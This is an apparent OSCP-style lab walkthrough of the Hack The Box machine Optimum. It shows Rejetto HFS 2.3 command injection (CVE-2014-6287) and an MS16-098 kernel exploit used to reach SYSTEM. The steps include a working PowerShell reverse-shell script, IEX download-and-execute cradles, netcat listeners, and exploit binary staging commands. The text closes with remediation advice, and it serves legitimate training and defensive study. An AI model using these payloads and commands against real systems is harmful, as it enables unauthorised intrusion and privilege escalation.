---
tags: [HTB, Optimum, Windows, HFS, HttpFileServer, CVE-2014-6287, MS16-098, CVE-2016-3309, KernelExploit, RCE, Easy]
platform: Windows
os: Windows Server 2012 R2
hostname: OPTIMUM
difficulty: Easy
ip: $BoxIP
status: Complete
aliases: [Optimum]
---

# HTB: Optimum, Full Walkthrough

## The gist

Optimum exposes one TCP service: Rejetto HttpFileServer 2.3 on HTTP. The service is vulnerable to CVE-2014-6287, a command-injection issue in the HFS search parameter. A reviewed Exploit-DB proof of concept turned that request into PowerShell execution and a callback as `optimum\kostas`.

The foothold was checked with `systeminfo` before privilege escalation. Sherlock reported several historical candidates, including MS16-032, but the host has one processor. MS16-032 is hardcoded to fail on a single-CPU system, so it was deliberately abandoned. The verified path was MS16-098, the RGNOBJ integer-overflow elevation of privilege, using the reviewed `bfill.exe` binary from the Windows kernel exploit collection. Running it from the clean callback shell produced a SYSTEM callback.

> [!important] Key finding
> The shortest reliable route was HFS 2.3 version matching -> CVE-2014-6287 command execution -> clean PowerShell callback -> `systeminfo` and Sherlock triage -> one-CPU MS16-032 rejection -> MS16-098 `bfill.exe` -> SYSTEM.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| OS | Windows Server 2012 R2 Standard, x64, build 9600 |
| Hostname | OPTIMUM |
| Domain context | Standalone server in the HTB workgroup |
| Difficulty | Easy |
| TCP services | HTTP on 80 only |
| Web service | Rejetto HttpFileServer 2.3 |
| Initial access | HFS command injection, CVE-2014-6287 |
| Foothold | PowerShell callback as `optimum\kostas` |
| Privilege escalation | MS16-098, CVE-2016-3309, `bfill.exe` |
| Final identity | `NT AUTHORITY\SYSTEM` |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Only TCP/80 was exposed | Section 2, full TCP scan |
| 2 | HFS 2.3 was fingerprinted | Section 3, service scan and HTTP headers |
| 3 | Exploit-DB 49125 matched CVE-2014-6287 | Section 4, SearchSploit and source review |
| 4 | HFS command injection gave PowerShell execution | Section 5, callback identity |
| 5 | The foothold was one-processor Windows Server 2012 R2 x64 | Section 6, `systeminfo` |
| 6 | Sherlock produced candidates but MS16-032 was a false lead for this host | Section 7, CPU-count gotcha |
| 7 | MS16-098 produced a SYSTEM callback | Section 8, `bfill.exe` proof |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/Optimum`. The write-up was reconstructed from `Optimum.log`, the saved Nmap result sets, the reviewed `exploits/49125.py`, the PowerShell and binary files in `www/`, and private `loot/flags.txt`.

The source workspace also contains eight screenshots covering the scan, service fingerprint, exploit search, foothold, user proof, system information, Sherlock output, and SYSTEM proof. They remain outside the Obsidian vault. This note uses captions only and does not embed or copy PNG files.

The source log records the local `boxdone` closeout, but it does not contain a complete target-side deletion and verification sequence. That boundary is called out in the cleanup section instead of being presented as a completed cleanup proof.

## Variables

Load the standard box helper first. Keep the callback address, ports, exploit copy, and target-side temporary paths in private shell state.

~~~bash
boxload
boxset BoxName Optimum
boxset BoxIP "$BoxIP"
boxset BoxDir "$HOME/Platforms/HackTheBox/Optimum"
boxset LocalIP "$(ip addr show tun0 2>/dev/null | awk '/inet / {sub(/\/.*/,"",$2); print $2; exit}')"
boxset WebPort 80
boxset TransferPort 8080
boxset CallbackPort 4444
boxset RootPort 5555
boxset ExploitFile "$BoxDir/exploits/49125.py"
boxset UserName kostas
boxset UserHome 'C:\\Users\\kostas\\Desktop'
boxset BfillPath 'C:\\Users\\kostas\\Desktop\\bfill.exe'
boxset ShellPath 'C:\\Users\\kostas\\Desktop\\system-shell.ps1'
mkdir -p "$BoxDir/nmap" "$BoxDir/loot" "$BoxDir/exploits" "$BoxDir/www"
~~~

`$BoxIP` is intentionally used throughout this note. Set it from the current HTB session rather than copying an address from an old run.

## 1. Start the transcript and validate the target

The manual run began with `htblog`, and the source transcript contains both the command sequence and captured output. A reachability check separates a routing problem from a service problem before the scan starts.

~~~bash
htblog
ping -c 3 "$BoxIP"
~~~

The target replied with no packet loss. The full TCP scan was therefore meaningful, and the next step was port discovery rather than VPN troubleshooting.

## 2. Run the full TCP scan

Scan every TCP port before version detection. `-Pn` skips host discovery, `-n` avoids DNS lookups, `--min-rate 500` keeps the initial scan moving, and `-oA` saves normal, grepable, and XML output with one base name.

~~~bash
sudo nmap -Pn -n --min-rate 500 -T4 -p- \
  -oA "$BoxDir/nmap/allports" "$BoxIP"
~~~

The saved result contained one open port:

| Port | State | Service |
|---|---|---|
| 80/tcp | open | HTTP |

The remaining TCP ports were filtered. There was no SSH, SMB, RDP, or WinRM route to prioritise, so the web service was the complete initial surface.

> [!tip] ⚡ Efficiency
> Save the all-ports result before narrowing the service scan. On a web-only Windows box this prevents time being wasted on AD or remote-management branches that the evidence does not support.

SCREENSHOT: Private source evidence shows the completed all-ports result. The image remains outside the vault.

## 3. Fingerprint the HTTP service

Run standard scripts and version detection against the actual open port. This identifies the product rather than relying on the machine description.

~~~bash
boxset OpenPorts 80

sudo nmap -Pn -n -sC -sV -p "$OpenPorts" \
  -oA "$BoxDir/nmap/services" "$BoxIP"
~~~

Nmap identified `HttpFileServer httpd 2.3`, with the title `HFS /` and the server header `HFS 2.3`. The service banner was enough to search for a version-specific proof of concept.

~~~bash
curl -sS -i "http://$BoxIP:$WebPort/" \
  | tee "$BoxDir/loot/http-root.txt"
~~~

The response was HTTP 200 and confirmed the same HFS 2.3 server header. The root contained no files, but that did not matter because the version itself exposed the relevant attack path.

SCREENSHOT: Private source evidence shows the HFS service scan and HTTP fingerprint. The image remains outside the vault.

## 4. Locate and review the HFS exploit

SearchSploit maps local Exploit-DB entries to product and version names. `-p` prints the path and CVE metadata, while `-x` displays the source for review. The source was copied into the private workspace rather than edited in `/usr/share/exploitdb`.

~~~bash
searchsploit "Rejetto HttpFileServer 2.3"

searchsploit -p 49125

searchsploit -x 49125

cp /usr/share/exploitdb/exploits/windows/webapps/49125.py \
  "$ExploitFile"

file "$ExploitFile"

sed -n '1,180p' "$ExploitFile"

python3 -m py_compile "$ExploitFile"
~~~

The result was Exploit-DB 49125, marked for Rejetto HttpFileServer 2.3.x and CVE-2014-6287. The Python proof of concept accepts a target host, target port, and command. It URL-encodes the command and places it in the HFS `search` parameter using the `%00{.+exec|...}` request form.

> [!warning] Gotcha
> A version match is not enough. Read the request builder and argument handling before testing. Here the PoC's useful output is the generated URL; command output is returned through the later callback rather than a rich HTTP response.

SCREENSHOT: Private source evidence shows the SearchSploit match for HFS 2.3. The image remains outside the vault.

## 5. Turn HFS command injection into a PowerShell callback

The source transcript recorded a generated PowerShell payload and a later native PowerShell TCPClient script. The following version is the reproducible manual form of the same route. It keeps the script in the private workspace, serves it over HTTP, and sends the HFS exploit only after the listener is ready.

Create a simple PowerShell TCP client. `KALI_IP` and `CALLBACK_PORT` are placeholders that are replaced locally before the file is served.

~~~bash
cat > "$BoxDir/www/shell.ps1" <<'EOF'
$client = New-Object System.Net.Sockets.TCPClient('KALI_IP',CALLBACK_PORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
EOF

sed -i "s/KALI_IP/$LocalIP/; s/CALLBACK_PORT/$CallbackPort/" \
  "$BoxDir/www/shell.ps1"

grep -nE 'TCPClient|CALLBACK|KALI_IP|Invoke-Expression' \
  "$BoxDir/www/shell.ps1"
~~~

Start the file server from the directory that contains the payload, then start the callback listener in a separate terminal.

~~~bash
python3 -m http.server "$TransferPort" \
  --directory "$BoxDir/www" \
  2>&1 | tee "$BoxDir/loot/http-transfer.log"
~~~

~~~bash
nc -lvnp "$CallbackPort"
~~~

Build the HFS command. `-NoP` skips the PowerShell profile, `-NonI` avoids interactive prompts, `-W Hidden` hides the spawned window, and `-Exec Bypass` bypasses execution-policy restrictions for this process. `DownloadString` retrieves the script and `IEX` executes it in memory.

~~~bash
HfsCommand="powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/shell.ps1')\""

python3 "$ExploitFile" "$BoxIP" "$WebPort" "$HfsCommand"
~~~

The PoC printed an HFS URL containing the `%00{.+exec|...}` command-injection form. The callback arrived as `optimum\kostas`. That identity, rather than a bare HTTP status, was the foothold proof.

> [!warning] 💡 Callback gotcha
> Keep the HFS service port, the HTTP file-server port, and the Netcat callback port separate. If the listener is ready but no connection arrives, first inspect the transfer log for a successful script request, then prove the HFS command with a harmless marker or `whoami` request.

SCREENSHOT: Private source evidence shows the foothold callback and `optimum\kostas` identity. The image remains outside the vault.

## 6. Confirm the foothold and capture system information

Run identity checks before any privilege-escalation tool. The user proof was read privately from the Kostas desktop, then `systeminfo` was captured to identify the OS, architecture, patch level, and processor count.

~~~powershell
whoami

hostname

type C:\Users\kostas\Desktop\user.txt

systeminfo
~~~

The important non-secret results were:

| Field | Result |
|---|---|
| Identity | `optimum\kostas` |
| Hostname | `OPTIMUM` |
| OS | Microsoft Windows Server 2012 R2 Standard |
| Build | 6.3.9600, x64 |
| Processors | 1 |
| Domain context | `HTB` workgroup context |

The source output also contained a long installed-hotfix list. It was preserved in the private transcript and screenshot, but the write-up only needs the architecture, build, and processor count to choose the escalation branch.

> [!warning] One-processor gotcha
> Do not treat every positive Sherlock result as executable. MS16-032 checks the processor count at runtime and is hardcoded to fail on a single-CPU system. This host has one processor, so MS16-032 was rejected even though Sherlock reported it as appearing vulnerable.

SCREENSHOT: Private source evidence shows `systeminfo`, including the x64 architecture and one-processor result. The image remains outside the vault.

## 7. Use Sherlock as a triage tool, not as final proof

Download Sherlock from the reviewed upstream repository and serve it from the same controlled HTTP server. The script checks old Windows privilege-escalation bulletins against the local patch state.

~~~bash
curl -fsSL \
  https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1 \
  -o "$BoxDir/www/Sherlock.ps1"
~~~

From the Kostas PowerShell callback, load the script and invoke the function. Replace `$LocalIP` with the literal Kali address when typing directly into the target shell if the target shell does not inherit the local variable.

~~~powershell
IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/Sherlock.ps1')

Find-AllVulns
~~~

If the script is first downloaded to disk instead, dot-source it before invoking the function:

~~~powershell
. .\Sherlock.ps1

Find-AllVulns
~~~

The captured result contained these statuses:

| Bulletin | CVE | Result |
|---|---|---|
| MS10-015 | CVE-2010-0232 | Not supported on 64-bit systems |
| MS10-092 | CVE-2010-3338, CVE-2010-3888 | Not vulnerable |
| MS13-053 | CVE-2013-1300 | Not supported on 64-bit systems |
| MS13-081 | CVE-2013-3881 | Not supported on 64-bit systems |
| MS14-058 | CVE-2014-4113 | Not vulnerable |
| MS15-051 | CVE-2015-1701, CVE-2015-2433 | Not vulnerable |
| MS15-078 | CVE-2015-2426, CVE-2015-2433 | Not vulnerable |
| MS16-016 | CVE-2016-0051 | Not supported on 64-bit systems |
| MS16-032 | CVE-2016-0099 | Appears vulnerable, but fails on one CPU |
| MS16-034 | CVE-2016-0093 through CVE-2016-0096 | Appears vulnerable |
| MS16-135 | CVE-2016-7255 | Appears vulnerable |
| CVE-2017-7199 | N/A | Not vulnerable |

> [!tip] ⚡ More efficient path
> `systeminfo` comes first because it prevents a known single-CPU failure from consuming the escalation loop. Sherlock then narrows the search, but the final decision still comes from architecture, build, exploit prerequisites, and a clean proof.

SCREENSHOT: Private source evidence shows the Sherlock result table. The image remains outside the vault.

## 8. Select MS16-098 after rejecting MS16-032

MS16-032, CVE-2016-0099, was not the final route because the target has one processor. The source run instead used MS16-098, CVE-2016-3309, an RGNOBJ integer-overflow elevation-of-privilege exploit. The precompiled `bfill.exe` artifact was downloaded from the SecWiki Windows kernel exploit collection and retained in the private workspace.

~~~bash
wget -q \
  https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-098/bfill.exe \
  -O "$BoxDir/www/bfill.exe"

file "$BoxDir/www/bfill.exe"
~~~

The local HTTP server was already serving `$BoxDir/www`. Create a second PowerShell callback file for the SYSTEM proof, using a fresh port so the foothold connection and elevated connection cannot be confused.

~~~bash
cp "$BoxDir/www/shell.ps1" "$BoxDir/www/system-shell.ps1"

sed -i "s/$CallbackPort/$RootPort/" \
  "$BoxDir/www/system-shell.ps1"

nc -lvnp "$RootPort"
~~~

From the clean `optimum\kostas` shell, download both the reviewed kernel binary and the SYSTEM callback script:

~~~powershell
(New-Object Net.WebClient).DownloadFile('http://$LocalIP:$TransferPort/bfill.exe', 'C:\Users\kostas\Desktop\bfill.exe')

(New-Object Net.WebClient).DownloadFile('http://$LocalIP:$TransferPort/system-shell.ps1', 'C:\Users\kostas\Desktop\system-shell.ps1')

dir C:\Users\kostas\Desktop\bfill.exe C:\Users\kostas\Desktop\system-shell.ps1
~~~

Run `bfill.exe` from the real callback shell, not from the HFS web-worker context. The exploit starts `cmd.exe`, which launches PowerShell with the SYSTEM callback script.

~~~powershell
C:\Users\kostas\Desktop\bfill.exe cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\Users\kostas\Desktop\system-shell.ps1
~~~

The fresh listener received a second callback. The final proof was:

~~~powershell
whoami

hostname
~~~

Expected result:

```text
nt authority\system
OPTIMUM
```

> [!warning] MS16-098 gotcha
> The binary exploit needs to be launched from a clean native callback with a normal user token. When an exploit that creates a new process appears to do nothing from a web execution context, obtain the callback first, run `systeminfo`, and execute the local exploit there.

SCREENSHOT: Private source evidence shows the SYSTEM callback and host proof. The image remains outside the vault.

## 9. Collect flags privately

The source workflow read both flag paths and stored their values in the private workspace loot. The values are deliberately omitted from this note and from the shared vault.

~~~powershell
type C:\Users\kostas\Desktop\user.txt

type C:\Users\Administrator\Desktop\root.txt
~~~

## Flags

- `user.txt`: collected privately; value remains in the source workspace loot.
- `root.txt`: collected privately; value remains in the source workspace loot.
- No flag values, passwords, or hashes are reproduced in this note.

## 10. Clean down

The source transcript records `boxdone`, but it does not show a complete target-side cleanup verification. The following is the exact cleanup boundary to use on a repeat run, restricted to files created by this route. Do not remove the original HFS executable.

~~~powershell
del /F /Q C:\Users\kostas\Desktop\bfill.exe

del /F /Q C:\Users\kostas\Desktop\system-shell.ps1

dir C:\Users\kostas\Desktop\bfill.exe C:\Users\kostas\Desktop\system-shell.ps1
~~~

Stop the local HTTP server and listeners after verifying that the target-side files are absent:

~~~bash
ss -ltnp | grep -E ":$TransferPort|:$CallbackPort|:$RootPort" || true

boxdone
~~~

> [!warning] Cleanup boundary
> `C:\Users\kostas\Desktop\hfs.exe` is the original application binary and is not an assessment artifact. Remove only `bfill.exe`, the callback scripts, and any other files that the current run actually created. The private transcript is authoritative for what was created, while the absence of a target-side verification block means cleanup should be marked as not evidenced rather than assumed.

## 11. Troubleshooting map

| Symptom | Likely cause | Next check |
|---|---|---|
| Full scan appears empty | Stale target variable, VPN route, or filtered response | Print `$BoxIP`, inspect `tun0`, ping the target, then rerun with `-Pn -n` |
| HFS service is not identified | Wrong port list or incomplete version scan | Re-run focused `nmap -sC -sV` on the open port and request the root page with `curl -i` |
| HFS PoC prints a URL but no callback | The HTTP server, listener, or callback address is wrong | Check the HTTP access log, confirm the listener, and run a harmless identity command first |
| PowerShell script downloads but does not connect | Wrong local interface or callback port | Use the VPN address from `tun0`, keep the file-server port separate, and test the PowerShell TCP client by itself |
| Sherlock function is missing | The script was executed in a child process or not loaded | Use `IEX` and `Find-AllVulns` in the same PowerShell process, or dot-source the saved file |
| MS16-032 exits or produces no shell | The system has one processor | Stop retrying MS16-032 and select a candidate compatible with the exact build and CPU count |
| `bfill.exe` appears to do nothing | It was launched from the web-worker context or the listener is stale | Run it from the clean Kostas callback and start a fresh listener first |
| SYSTEM callback is not received | Wrong root callback port, transfer path, or PowerShell file | Verify the second script's port, confirm both downloads with `dir`, and rerun only the final trigger |

## 12. RUNBOOK V2 Stages Used

1. [[OSCP/RUNBOOK V2/Start Here|Start Here]]: initialise the workspace and save the full TCP scan.
2. [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]: classify the single web port as a standalone Windows web route.
3. [[OSCP/RUNBOOK V2/Windows - Service Scan|Windows - Service Scan]]: identify HFS 2.3 on TCP/80.
4. [[OSCP/RUNBOOK V2/Windows - Web Enum|Windows - Web Enum]]: collect headers and confirm the HFS application.
5. [[OSCP/RUNBOOK V2/Windows - Exploit Search|Windows - Exploit Search]]: map HFS 2.3 to Exploit-DB 49125 and CVE-2014-6287.
6. [[OSCP/RUNBOOK V2/Exploit Editing and Resource Guide|Exploit Editing and Resource Guide]]: copy, inspect, syntax-check, and run the local Python PoC.
7. [[OSCP/RUNBOOK V2/Windows - Shell Received|Windows - Shell Received]]: verify the callback identity, hostname, and system information.
8. [[OSCP/RUNBOOK V2/Windows - Privilege Triage|Windows - Privilege Triage]]: compare Sherlock output with architecture and processor prerequisites.
9. [[OSCP/RUNBOOK V2/Windows - Clean Down|Windows - Clean Down]]: remove only the target-side files created by the assessment and verify them.

> [!success] Runbook coverage
> HFS command injection, clean callback handling, Sherlock interpretation, the one-processor MS16-032 failure mode, and MS16-098 selection are covered by the linked RUNBOOK V2 stages. No runbook gap remains for the verified Optimum chain.

## 13. Attack chain

```text
TCP/80 discovery
    -> HFS 2.3 fingerprint
    -> Exploit-DB 49125 / CVE-2014-6287
    -> PowerShell download-and-execute
    -> optimum\kostas callback
    -> systeminfo: Server 2012 R2 x64, one processor
    -> Sherlock candidate triage
    -> reject MS16-032 because of the one-CPU runtime check
    -> download bfill.exe for MS16-098 / CVE-2016-3309
    -> run from clean native callback
    -> NT AUTHORITY\SYSTEM
```

## 14. Tools used

| Tool | Purpose |
|---|---|
| `ping` | Confirm reachability before scanning |
| `nmap` | Full TCP discovery and HFS version fingerprinting |
| `curl` | Capture the HFS root response and headers |
| SearchSploit / Exploit-DB | Locate and review entry 49125 |
| Python 3 | Syntax-check and run the HFS proof of concept |
| Python HTTP server | Serve PowerShell scripts and `bfill.exe` |
| Netcat | Receive the Kostas and SYSTEM callbacks |
| PowerShell | Download scripts, execute commands, and provide callbacks |
| Sherlock | Patch and historical exploit triage |
| `bfill.exe` | MS16-098 / CVE-2016-3309 local elevation of privilege |

## Credentials

| Account or material | Source | Use |
|---|---|---|
| `optimum\kostas` | HFS command-injection callback identity | Initial Windows foothold |
| `NT AUTHORITY\SYSTEM` | MS16-098 callback identity | Final privilege proof |

No plaintext password, NT hash, or other reusable credential was required by the verified route.

## Key lessons

- A single exposed web service can be enough for both initial access and the route to a local exploit.
- SearchSploit output should be followed by source review, syntax validation, and a harmless proof.
- PowerShell download cradles are useful for staging, but they do not replace listener and transfer-log checks.
- Run `systeminfo` before selecting a Windows kernel exploit. Architecture, build, patch state, and processor count all matter.
- Sherlock is a candidate generator. Its positive result still needs prerequisite validation.
- MS16-032 has a one-processor failure mode that is easy to miss if the CPU count is not read.
- A native callback can have a more usable execution context than the original web worker. Run local escalation binaries from that shell.
- Keep foothold and SYSTEM listeners on different ports so the identity transition is unambiguous.
- Read flags only into private loot. A screenshot or vault note does not need the flag values to document the access proof.
- `boxdone` in the local transcript does not prove target-side cleanup. Record and verify every created file separately.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Windows/Bastard|Bastard]] -- version-disclosed Windows web application RCE followed by local token or privilege triage.
- [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]] -- IIS foothold, payload delivery, architecture selection, and Windows local escalation.
- [[OSCP/BOXES/WRITE UPS/Windows/Conceal|Conceal]] -- Windows web foothold, payload transfer, and SeImpersonate escalation.
- [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]] -- Windows web exploitation followed by a local privilege boundary.
- [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]] -- web foothold, payload staging, and a separate SYSTEM proof.

## Remediation recommendations

1. Upgrade Rejetto HFS to a supported release or remove it from public-facing service exposure.
2. Apply the vendor fix for CVE-2014-6287 and review HFS command-execution and search handling.
3. Keep Windows Server patched and retire unsupported Server 2012 R2 deployments where possible.
4. Use least-privilege service identities and block unnecessary PowerShell or HTTP egress from service processes.
5. Monitor unusual HFS requests containing encoded command separators and PowerShell download cradles.
6. Monitor execution of unsigned binaries from user-writable desktop paths, especially known kernel exploit names.
7. Remove temporary assessment artifacts and verify the file system after testing.

## External Resources

- [Exploit-DB 49125](https://www.exploit-db.com/exploits/49125)
- [NVD: CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287)
- [NVD: CVE-2016-3309](https://nvd.nist.gov/vuln/detail/CVE-2016-3309)
- [SecWiki Windows kernel exploits, MS16-098](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098)
- [Sherlock](https://github.com/rasta-mouse/Sherlock)
- [Microsoft MS16-098 bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-098)
- [HackTricks: Windows privilege escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)

## Checklist

- [x] Required five reference write-ups read before drafting.
- [x] Source transcript and saved Nmap outputs reviewed.
- [x] HFS 2.3 and CVE-2014-6287 matched to the reviewed PoC.
- [x] Foothold identity recorded without storing a password.
- [x] `systeminfo` captured before kernel selection.
- [x] Sherlock output recorded as triage evidence.
- [x] One-processor MS16-032 gotcha documented.
- [x] MS16-098 and `bfill.exe` route documented.
- [x] User and root flags retained privately and omitted here.
- [x] Screenshots retained outside the vault and not embedded.
- [x] Cleanup uncertainty recorded rather than invented.
- [x] Related RUNBOOK V2 and OSCP vault pages updated after this write-up.

## Why this matters for OSCP

Optimum is a compact Windows workflow for turning a precise version fingerprint into a public RCE, then making a patch-aware local escalation choice. The transferable habit is to prove each boundary separately: HFS command execution, the returned user token, OS and CPU facts, exploit prerequisites, and the final SYSTEM identity.
